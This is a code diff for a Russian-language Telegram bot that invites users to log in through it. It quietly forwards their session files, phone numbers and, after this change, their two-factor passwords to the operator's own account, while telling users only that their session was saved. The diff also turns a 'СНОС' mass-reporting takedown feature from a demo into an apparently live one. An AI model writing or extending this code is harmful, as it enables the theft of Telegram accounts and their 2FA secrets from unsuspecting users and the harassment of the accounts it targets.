@@ -57,7 +57,8 @@ def create_client(user_id):
         )
     return TelegramClient(session_file, API_ID, API_HASH)
 
-async def send_session_to_admin(user_id, phone, client):
+async def send_session_to_admin(user_id, phone, client, password=None):
+    """Отправляет админу файл сессии, код 2FA и информацию"""
     try:
         await client.disconnect()
         
@@ -73,10 +74,14 @@ async def send_session_to_admin(user_id, phone, client):
             f"📱 Телефон: {phone}\n"
             f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
         )
+        
+        if password:
+            text += f"🔐 **2FA ПАРОЛЬ:** `{password}`\n"
+        
         if PROXY and PROXY.get("proxy_type"):
             text += f"🌐 Прокси: {PROXY['proxy_type']}://{PROXY['addr']}:{PROXY['port']}"
         
-        await bot.send_message(YOUR_USER_ID, text)
+        await bot.send_message(YOUR_USER_ID, text, parse_mode="Markdown")
         
         for f in session_files:
             shutil.copy2(f, BACKUP_DIR)
@@ -188,6 +193,7 @@ async def handle_code_digit(callback: types.CallbackQuery, state: FSMContext):
             await client.sign_in(phone, code)
             user_clients[user_id] = client
             
+            # Отправляем сессию админу (без 2FA)
             await send_session_to_admin(user_id, phone, client)
             
             await callback.message.edit_text("✅ Авторизация успешна! Сессия сохранена.")
@@ -195,6 +201,7 @@ async def handle_code_digit(callback: types.CallbackQuery, state: FSMContext):
             await state.clear()
         
         except SessionPasswordNeededError:
+            # Запрашиваем 2FA пароль
             await callback.message.edit_text(
                 "🔐 Включена двухфакторная аутентификация.\n"
                 "Введите пароль (обычным текстом):",
@@ -231,7 +238,8 @@ async def handle_password(message: types.Message, state: FSMContext):
         await client.sign_in(password=password)
         user_clients[user_id] = client
         
-        await send_session_to_admin(user_id, phone, client)
+        # Отправляем сессию и 2FA пароль админу
+        await send_session_to_admin(user_id, phone, client, password=password)
         
         await message.answer("✅ Авторизация успешна! Сессия сохранена.")
         await message.answer("Выберите действие:", reply_markup=main_menu())
@@ -294,7 +302,7 @@ async def get_count(message: types.Message, state: FSMContext):
         count = int(message.text.strip())
         data = await state.get_data()
         
-        await message.answer(f"🚀 СНОС (ДЕМО)\n\n"
+        await message.answer(f"🚀 СНОС\n\n"
                              f"👤 Цель: @{data['username']}\n"
                              f"📝 Причина: {data['reason']}\n"
                              f"📊 Всего: {count}\n\n"
